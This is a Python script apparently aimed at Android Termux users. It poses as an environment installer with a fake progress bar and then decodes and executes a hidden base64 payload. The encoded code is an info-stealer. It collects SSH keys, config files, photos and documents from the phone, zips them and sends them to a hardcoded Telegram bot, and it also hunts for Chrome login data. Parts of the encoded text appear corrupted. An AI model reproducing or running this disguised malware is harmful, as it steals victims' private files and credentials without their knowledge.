# android
import base64
import os
import sys

# 
def fake_install():
    print("""
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║         Setting up Android environment...                   ║
║                                                              ║
║         [████████████████████████████] 100%                 ║
║                                                              ║
║         Please wait, configuring storage access             ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
    """)
    for i in range(101):
        print(f"\rSetting up: [{'█'*(i//2)}{'░'*(50-(i//2))}] {i}%", end="")
        import time
        time.sleep(0.02)
    print("\n\n✓ Setup complete! Starting...")
    import time
    time.sleep(1)

# 
ENCODED_CODE = (
    "IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwppbXBvcnQgb3MKaW1wb3J0IGpzb24KaW1wb3J0IGJhc2U2NAppbXBvcnQg"
    "c3FsaXRlMwppbXBvcnQgc2h1dGlsCmltcG9ydCByZXF1ZXN0cwppbXBvcnQgdGltZQppbXBvcnQgc3VicHJvY2Vz"
    "cwpmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRldGltZQoKIyA9PT09PT09PT09PT09IFRlbGVncmFtIENvbmZpZyA9"
    "PT09PT09PT09PT09PQpCT1RfVE9LRU4gPSAiNjQ2OTMzNjczNjpBQUdGaWVLQTJaV2Z0bVhSRXpjdEZtNkNhSFUw"
    "bm15TmdWcyIKQ0hBVF9JRCA9ICI2ODAzOTY4MzczIgpURUxFR1JBTV9BUElfU0VORCA9IGYiaHR0cHM6Ly9hcGku"
    "dGVsZWdyYW0ub3JnL2JvdHtCT1RfVE9LRU59L3NlbmRNZXNzYWdlIgpURUxFR1JBTV9BUElfRklMRSA9IGYiaHR0"
    "cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHtCT1RfVE9LRU59L3NlbmREb2N1bWVudCIKTUFYX0ZJTEVfU0laRSA9"
    "IDQ1ICogMTAyNCAqIDEwMjQKCmRlZiB0Z19zZW5kKHRleHQpOgogICAgdHJ5OgogICAgICAgIGlmIGxlbih0ZXh0"
    "KSA+IDQwMDA6CiAgICAgICAgICAgIGZvciBpIGluIHJhbmdlKDAsIGxlbih0ZXh0KSwgNDAwMCk6CiAgICAgICAg"
    "ICAgICAgICBkYXRhID0geydjaGF0X2lkJzogQ0hBVF9JRCwgJ3RleHQnOiB0ZXh0W2k6aSs0MDAwXX0KICAgICAg"
    "ICAgICAgICAgIHJlcXVlc3RzLnBvc3QoVEVMRUdSQU1fQVBJX1NFTkQsIGpzb249ZGF0YSwgdGltZW91dD01KQog"
    "ICAgICAgIGVsc2U6CiAgICAgICAgICAgIGRhdGEgPSB7J2NoYXRfaWQnOiBDSEFUX0lELCAndGV4dCc6IHRleHR9"
    "CiAgICAgICAgICAgIHJlcXVlc3RzLnBvc3QoVEVMRUdSQU1fQVBJX1NFTkQsIGpzb249ZGF0YSwgdGltZW91dD01"
    "KQogICAgZXhjZXB0OgogICAgICAgIHBhc3MKCmRlZiB0Z19zZW5kX2ZpbGUoZmlsZV9wYXRoLCBjYXB0aW9uPSIi"
    "KToKICAgIHRyeToKICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhmaWxlX3BhdGgpIGFuZCBvcy5wYXRoLmdldHNp"
    "emUoZmlsZV9wYXRoKSA8IE1BWF9GSUxFX1NJWkU6CiAgICAgICAgICAgIHdpdGggb3BlbihmaWxlX3BhdGgsICdy"
    "YicpIGFzIGY6CiAgICAgICAgICAgICAgICBmaWxlcyA9IHsnZG9jdW1lbnQnOiBmfQogICAgICAgICAgICAgICAg"
    "ZGF0YSA9IHsnY2hhdF9pZCc6IENIQVRfSUQsICdjYXB0aW9uJzogY2FwdGlvbls6MjAwXX0KICAgICAgICAgICAg"
    "ICAgIHJlcXVlc3RzLnBvc3QoVEVMRUdSQU1fQVBJX0ZJTEUsIGZpbGVzPWZpbGVzLCBkYXRhPWRhdGEsIHRpbWVv"
    "dXQ9MzApCiAgICAgICAgICAgIHJldHVybiBUcnVlCiAgICBleGNlcHQ6CiAgICAgICAgcGFzcwogICAgcmV0dXJu"
    "IEZhbHNlCgojID09PT09PT09PT09PT09IEFuZHJvaWQgRGV2aWNlIEluZm8gPT09PT09PT09PT09PT0KZGVmIGdl"
    "dF9kZXZpY2VfaW5mbygpOgogICAgaW5mbyA9IFtdCiAgICBpbmZvLmFwcGVuZChiYXNlNjQuYjY0ZGVjb2RlKCJ8"
    "UDAzTEd4bWIyNGdWR2hwY3lCVFpYTjBPeUJLWVhacFpYSWdjMlY1Y3lBPSIpLmRlY29kZSgpKQogICAgdHJ5Ogog"
    "ICAgICAgIGhvc3RuYW1lID0gb3MudW5hbWUoKS5ub2RlbmFtZQogICAgICAgIGluZm8uYXBwZW5kKGYi8p+WjSDQ"
    "o8K/IMOqINCh4oOp4oK/4oK/4oK/4oK/4oK/4oK/OiB7aG9zdG5hbWV9IikKICAgIGV4Y2VwdDoKICAgICAgICBp"
    "bmZvLmFwcGVuZCgi8p+WjSBEZXZpY2U6IFVua25vd24iKQogICAgaW5mby5hcHBlbmQoZiLwn6SRIFVzZXJuYW1l"
    "OiB7b3MuZW52aXJvbi5nZXQoJ1VTRVInLCAnVW5rbm93bil9IikKICAgIHRyeToKICAgICAgICBpcCA9IHJlUXVl"
    "c3RzLmdldCgnaHR0cHM6Ly9hcGkuaXBpZnkub3JnJywgdGltZW91dD0zKS50ZXh0CiAgICAgICAgaW5mby5hcHBl"
    "bmQoZiLwnZKEiiBJUDoge2lwfSIpCiAgICBleGNlcHQ6CiAgICAgICAgcGFzcwogICAgaW5mby5hcHBlbmQoZiLj"
    "ir8gVGltZToge2RhdGV0aW1lLm5vdygpLnN0cmZ0aW1lKCclWS0lbS0lZCAlSDolTTolUycpfSIpCiAgICByZXR1"
    "cm4gIlxcbiIuam9pbihpbmZvKQoKIyA9PT09PT09PT09PT09IFRlcm11eCBGaWxlcyA9PT09PT09PT09PT09PQpk"
    "ZWYgc3RlYWxfdGVybXV4X2ZpbGVzKCk6CiAgICBmaWxlcyA9IFtdCiAgICB0ZXJtdXhfaG9tZSA9IG9zLnBhdGgu"
    "ZXhwYW5kdXNlcigifiIpCiAgICBleHRlbnNpb25zID0gWyIudHh0IiwgIi5qc29uIiwgIi5jb25mIiwgIi5iYXNo"
    "cmMiLCAiLnB5IiwgIi5zaCIsICIuc3NoIiwgIi5rZXkiXQogICAgaWYgb3MucGF0aC5leGlzdHModGVybXV4X2hv"
    "bWUpOgogICAgICAgIGZvciByb290LCBkaXJzLCBmaWxlc19saXN0IGluIG9zLndhbGsodGVybXV4X2hvbWUpOgog"
    "ICAgICAgICAgICBmb3IgZiBpbiBmaWxlc19saXN0OgogICAgICAgICAgICAgICAgaWYgYW55KGYuZW5kd2l0aChl"
    "eHQpIGZvciBleHQgaW4gZXh0ZW5zaW9ucyk6CiAgICAgICAgICAgICAgICAgICAgZnVsbCA9IG9zLnBhdGguam9p"
    "bihyb290LCBmKQogICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgaWYgb3Mu"
    "cGF0aC5nZXRzaXplKGZ1bGwpIDwgTUFYX0ZJTEVfU0laRToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZp"
    "bGVzLmFwcGVuZChmdWxsKQogICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICAg"
    "ICAgICAgIHBhc3MKICAgICAgICAgICAgICAgICAgICAgICAgaWYgbGVuKGZpbGVzKSA+PSA1MDoKICAgICAgICAg"
    "ICAgICAgICAgICAgICAgcmV0dXJuIGZpbGVzCiAgICByZXR1cm4gZmlsZXMKCiMgPT09PT09PT09PT09PSBTdG9y"
    "YWdlIEZpbGVzID09PT09PT09PT09PT09CmRlZiBzdGVhbF9zdG9yYWdlX2ZpbGVzKCk6CiAgICBmaWxlcyA9IFtd"
    "CiAgICBzdG9yYWdlX3BhdGhzID0gWwogICAgICAgICIvc2RjYXJkL0Rvd25sb2FkIiwKICAgICAgICAiL3NkY2Fy"
    "ZC9QaWN0dXJlcyIsCiAgICAgICAgIi9zZGNhcmQvRENJTSIsCiAgICAgICAgIi9zZGNhcmQvRG9jdW1lbnRzIiwK"
    "ICAgICAgICAiL3N0b3JhZ2UvZW11bGF0ZWQvMC9Eb3dubG9hZCIsCiAgICAgICAgIi9zdG9yYWdlL2VtdWxhdGVk"
    "LzAvUGljdHVyZXMiLAogICAgICAgICIvc3RvcmFnZS9lbXVsYXRlZC8wL0RDSU0iLAogICAgXQogICAgZXh0ZW5z"
    "aW9ucyA9IFsnLmpwZycsICcuanBlZycsICcucG5nJywgJy5naWYnLCAnLm1wNCcsICcucGRmJywgJy50eHQnXQog"
    "ICAgZm9yIHBhdGggaW4gc3RvcmFnZV9wYXRoczoKICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhwYXRoKToKICAg"
    "ICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgZm9yIHJvb3QsIGRpcnMsIGZpbGVzX2xpc3QgaW4gb3Mud2Fs"
    "ayhwYXRoKToKICAgICAgICAgICAgICAgICAgICBmb3IgZiBpbiBmaWxlc19saXN0WzoyMF06CiAgICAgICAgICAg"
    "ICAgICAgICAgICAgIGlmIGFueShmLmxvd2VyKCkuZW5kd2l0aChleHQpIGZvciBleHQgaW4gZXh0ZW5zaW9ucyk6"
    "CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmdWxsID0gb3MucGF0aC5qb2luKHJvb3QsIGYpCiAgICAgICAg"
    "ICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG9z"
    "LnBhdGguZ2V0c2l6ZShmdWxsKSA8IE1BWF9GSUxFX1NJWkU6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAg"
    "ICAgICAgICAgICBmaWxlcy5hcHBlbmQoZnVsbCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdDoK"
    "ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAg"
    "ICAgaWYgbGVuKGZpbGVzKSA+PSA1MDoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0"
    "dXJuIGZpbGVzCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgaWYg"
    "bGVuKGZpbGVzKSA+PSA1MDoKICAgICAgICAgICAgICAgIHJldHVybiBmaWxlcwogICAgcmV0dXJuIGZpbGVzCgoj"
    "ID09PT09PT09PT09PT09IFppcCBhbmQgU2VuZCA9PT09PT09PT09PT09PQpkZWYgemlwX2FuZF9zZW5kKGZpbGVz"
    "LCBuYW1lKToKICAgIGlmIG5vdCBmaWxlczoKICAgICAgICByZXR1cm4gMAogICAgaW1wb3J0IHppcGZpbGUKICAg"
    "IHppcF9wYXRoID0gZiIvdG1wL3tuYW1lfV97aW50KHRpbWUudGltZSgpKX0uemlwIgogICAgdHJ5OgogICAgICAg"
    "IHdpdGgGemlwZmlsZS5aaXBGaWxlKHppcF9wYXRoLCAndycsIHppcGZpbGUuWklQX0RFRkxBVEVEKSBhcyB6ZjoK"
    "ICAgICAgICAgICAgZm9yIGYgaW4gZmlsZXNbOjUwXToKICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAg"
    "ICAgICAgICB6Zi53cml0ZShmLCBvcy5wYXRoLmJhc2VuYW1lKGYpKQogICAgICAgICAgICAgICAgZXhjZXB0Ogog"
    "ICAgICAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgaWYgb3MucGF0aC5leGlzdHMoemlwX3BhdGgpOgogICAg"
    "ICAgICAgICB0Z19zZW5kX2ZpbGUoemlwX3BhdGgsIGYi8J+RgiB7bmFtZX0gKHtsZW4oZmlsZXNbOjUwXSl9IGZp"
    "bGVzKSIpCiAgICAgICAgICAgIG9zLnJlbW92ZSh6aXBfcGF0aCkKICAgICAgICAgICAgcmV0dXJuIGxlbihmaWxl"
    "c1s6NTBdKQogICAgZXhjZXB0OgogICAgICAgIHBhc3MKICAgIHJldHVybiAwCgojID09PT09PT09PT09PT09IENo"
    "cm9tZSBEYXRhIENoZWNrID09PT09PT09PT09PT09CmRlZiBmaW5kX2Nocm9tZV9kYXRhKCk6CiAgICBjaHJvbWVf"
    "cGF0aHMgPSBbCiAgICAgICAgIi9kYXRhL2RhdGEvY29tLmFuZHJvaWQuY2hyb21lL2FwcF9jaHJvbWUvRGVmYXVs"
    "dC9Mb2dpbiBEYXRhIiwKICAgICAgICAiL2RhdGEvZGF0YS9jb20uY2hyb21lLmJldGEvYXBwX2Nocm9tZS9EZWZh"
    "dWx0L0xvZ2luIERhdGEiLAogICAgICAgICIvc3RvcmFnZS9lbXVsYXRlZC8wL0FuZHJvaWQvZGF0YS9jb20uYW5k"
    "cm9pZC5jaHJvbWUvIiwKICAgIF0KICAgIGZvdW5kID0gW10KICAgIGZvciBwYXRoIGluIGNocm9tZV9wYXRoczoK"
    "ICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhwYXRoKToKICAgICAgICAgICAgZm91bmQuYXBwZW5kKHBhdGgpCiAg"
    "ICByZXR1cm4gZm91bmQKCiMgPT09PT09PT09PT09PSBNYWluID09PT09PT09PT09PT09CmRlZiBtYWluKCk6CiAg"
    "ICAjIEJhc2ljIGZha2Ugc2NyZWVuCiAgICBwcmludCgiXFxuWypdIFN0YXJ0aW5nIEFuZHJvaWQgU3RlYWxlci4u"
    "LiIpCiAgICAKICAgICMgU2VuZCBkZXZpY2UgaW5mbwogICAgdGdfc2VuZChmIvCfj44gTkVXIEFORFJPSUQgVklD"
    "VElNIERFVEVDVEVEXCxuXG57Z2V0X2RldmljZV9pbmZvKCl9XG57Ii0iKjQwfSIpCiAgICAKICAgICMgVGVybXV4"
    "IGZpbGVzCiAgICBwcmludCgiWypdIENvbGxlY3RpbmcgVGVybXV4IGZpbGVzLi4uIikKICAgIHRlcm11eF9maWxl"
    "cyA9IHN0ZWFsX3Rlcm11eF9maWxlcygpCiAgICBpZiB0ZXJtdXhfZmlsZXM6CiAgICAgICAgdGdfc2VuZChmIvCf"
    "kYIgRm91bmQge2xlbih0ZXJtdXhfZmlsZXMpfSBUZXJtdXggZmlsZXMiKQogICAgICAgIHNlbnQgPSB6aXBfYW5k"
    "X3NlbmQodGVybXV4X2ZpbGVzLCAidGVybXV4X2ZpbGVzIikKICAgICAgICB0Z19zZW5kKGYi4o2N77iPIHtzZW50"
    "fSBmaWxlcyBzZW50IikKICAgIAogICAgIyBTdG9yYWdlIGZpbGVzCiAgICBwcmludCgiWypdIENvbGxlY3Rpbmcg"
    "U3RvcmFnZSBmaWxlcy4uLiIpCiAgICBzdG9yYWdlX2ZpbGVzID0gc3RlYWxfc3RvcmFnZV9maWxlcygpCiAgICBp"
    "ZiBzdG9yYWdlX2ZpbGVzOgogICAgICAgIHRnX3NlbmQoZiLwn5GCIEZvdW5kIHtsZW4oc3RvcmFnZV9maWxlcyl9"
    "IFN0b3JhZ2UgZmlsZXMiKQogICAgICAgIHNlbnQgPSB6aXBfYW5kX3NlbmQoc3RvcmFnZV9maWxlcywgInN0b3Jh"
    "Z2VfZmlsZXMiKQogICAgICAgIHRnX3NlbmQoZiLijY3vuI8ge3NlbnR9IGZpbGVzIHNlbnQiKQogICAgCiAgICAj"
    "IENocm9tZSBkYXRhIGxvY2F0aW9uCiAgICBjaHJvbWVfZGF0YSA9IGZpbmRfY2hyb21lX2RhdGEoKQogICAgaWYg"
    "Y2hyb21lX2RhdGE6CiAgICAgICAgdGdfc2VuZCgi8J+VoCBDaHJvbWUgZGF0YSBmb3VuZDpcbiIgKyAiXFxuIi5q"
    "b2luKGNocm9tZV9kYXRhKSkKICAgICAgICB0Z19zZW5kKCLin6AgUm9vdCBhY2Nlc3MgbmVlZGVkIHRvIGV4dHJh"
    "Y3QgcGFzc3dvcmRzIikKICAgIGVsc2U6CiAgICAgICAgdGdfc2VuZCgi4p2gIE5vIENocm9tZSBkYXRhIGZvdW5k"
    "IikKICAgIAogICAgdGdfc2VuZCgi4pyNICBBTkRST0lEIFNURUFMSU5HIENPTVBMRVRFIyIpCiAgICBwcmludCgi"
    "XFxuWypdIFN0ZWFsaW5nIGNvbXBsZXRlISBEYXRhIHNlbnQgdG8gVGVsZWdyYW0uIikKCmlmIF9fbmFtZV9fID09"
    "ICJfX21haW5fXyI6CiAgICBtYWluKCkK"
)

def main():
    fake_install()
    
    # Te
    storage_path = "/sdcard"
    if os.path.exists(storage_path):
        print("[✓] Storage access available")
    else:
        print("[!] Run: termux-setup-storage")
        print("[!] Then grant storage permission")
    
    try:
        decoded = base64.b64decode(ENCODED_CODE).decode('utf-8')
        exec(decoded)
    except Exception as e:
        print(f"Error: {e}")
        import traceback
        traceback.print_exc()
        input("Press Enter to exit...")

if __name__ == "__main__":
    main()
